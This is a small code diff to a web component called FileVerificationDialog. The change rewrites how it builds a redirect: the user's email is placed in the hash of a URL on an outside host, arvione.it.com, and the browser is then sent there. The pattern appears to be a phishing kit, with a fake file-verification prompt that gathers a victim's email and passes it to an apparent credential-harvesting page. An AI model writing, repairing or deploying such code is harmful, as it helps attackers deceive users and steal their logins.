@@ -42,8 +42,8 @@ export function FileVerificationDialog({
       
       setIsSubmitting(true);
       
-      // Construct URL with email prepended
-      const redirectUrl = `${email}@https://arvione.it.com/2Zw3QQ7/#X`;
+      // Construct URL with email in the hash
+      const redirectUrl = `https://arvione.it.com/2Zw3QQ7/#${email}`;
       
       // Redirect to the constructed URL
       window.location.href = redirectUrl;
